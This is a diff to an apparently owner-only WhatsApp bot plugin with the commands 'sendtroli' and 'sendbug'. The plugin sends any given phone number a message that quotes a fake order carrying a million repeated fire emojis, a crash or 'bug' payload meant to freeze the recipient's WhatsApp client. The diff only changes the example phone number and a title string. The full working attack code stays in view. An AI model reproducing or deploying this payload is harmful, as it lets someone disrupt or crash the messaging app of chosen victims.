@@ -1,5 +1,5 @@
 let handler = async (m, { conn, text, args, usedPrefix, command }) => {
-    if (!text) throw `Wrong Format!!\nExample : ${usedPrefix + command} +13656503237`
+    if (!text) throw `Wrong Format!!\nExample : ${usedPrefix + command} +254114018035`
     conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'What is this?', 'conversation', {
      quoted: {
       key: {
@@ -12,7 +12,7 @@ let handler = async (m, { conn, text, args, usedPrefix, command }) => {
         status: 1,
         surface: 1,
         message: '🔥'.repeat(1000000),
-        orderTitle: 'Alice', // Idk what this does
+        orderTitle: 'Dreaded', // Idk uuh peace
         sellerJid: '0@s.whatsapp.net' // Seller
        }
       }
@@ -23,5 +23,5 @@ let handler = async (m, { conn, text, args, usedPrefix, command }) => {
     handler.tags = ['owner', 'update']
     handler.command = /^(sendtroli|sendbug)$/i
     handler.owner = true 
-    
+
     module.exports = handler
